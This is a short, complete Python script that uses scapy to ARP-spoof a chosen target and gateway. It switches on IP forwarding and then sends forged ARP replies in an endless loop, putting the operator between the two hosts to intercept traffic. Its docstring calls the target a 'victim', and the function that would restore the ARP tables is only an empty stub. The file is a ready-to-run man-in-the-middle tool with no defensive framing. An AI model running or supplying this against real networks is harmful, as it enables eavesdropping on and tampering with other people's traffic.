#!/usr/bin/env
import scapy.all as scapy
import argparse
import time
import subprocess

def get_mac(dest_ip):
    arp_request = scapy.ARP(pdst=dest_ip)
    broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast_packet = broadcast_request / arp_request
    answered_packets = scapy.srp(arp_request_broadcast_packet, timeout=1, verbose=False)[0]
    return answered_packets[0][1].hwsrc

"""
:param target_ip: the IP address of the victim you are posing at the router to
:param source_ip: the IP address you are impersonating
"""

def spoof_arp(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    arp_response_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip)
    scapy.send(arp_response_packet, verbose=False)



#def restore_arp():



def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="the IP address of the target machine")
    parser.add_argument("-s", "--source", dest="source_ip", help="the IP address of the network gateway "
                                                                 "you are impersonating")
    arguments = parser.parse_args()
    return arguments


def execute():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    arguments = get_arguments()
    packet_count = 0
    print("Current target:" + "\t\t" + str(arguments.target_ip) + "\t" + str(get_mac(arguments.target_ip)))
    print("Current gateway:" + "\t\t" + str(arguments.source_ip) + "\t" + str(get_mac(arguments.source_ip)))
    print("\n")
    while True:
        spoof_arp(arguments.target_ip, arguments.source_ip)
        spoof_arp(arguments.source_ip, arguments.target_ip)
        time.sleep(2)
        print("\r[+] Packets sent: " + str(packet_count), end="")
        packet_count += 2


execute()